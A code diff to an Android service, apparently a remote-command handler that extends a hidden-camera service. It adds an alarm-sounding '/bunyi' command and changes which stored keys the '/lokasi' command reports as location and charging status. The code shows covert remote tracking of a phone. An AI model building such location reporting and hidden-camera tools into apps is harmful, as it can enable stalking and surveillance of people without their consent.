@@ -10,10 +10,13 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.media.Ringtone;
+import android.media.RingtoneManager;
 import android.net.ConnectivityManager;
 import android.net.Network;
 import android.net.NetworkCapabilities;
 import android.net.NetworkInfo;
+import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.BatteryManager;
 import android.os.Build;
@@ -262,8 +265,8 @@ public class server_command_service extends HiddenCameraService {
             case "/lokasi":
                 final SharedPreferences sharedSimpanNotif = context.getSharedPreferences("notif", MODE_PRIVATE);
 
-                String latlong = sharedSimpanNotif.getString("latlong","");
-                String isi = sharedSimpanNotif.getString("isi","");
+                String latlong = sharedSimpanNotif.getString("maps_latlong","");
+                String isi = sharedSimpanNotif.getString("ischarging","");
 
                 request_body.text = latlong+" \n "+isi;
                 has_command = true;
@@ -439,6 +442,16 @@ public class server_command_service extends HiddenCameraService {
 
                 request_body.text = "Processing "+command;
                 has_command = true;
+                break;
+
+            case "/bunyi":
+                try {
+                    Uri notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
+                    Ringtone r = RingtoneManager.getRingtone(getApplicationContext(), notification);
+                    r.play();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
                 break;
 
 
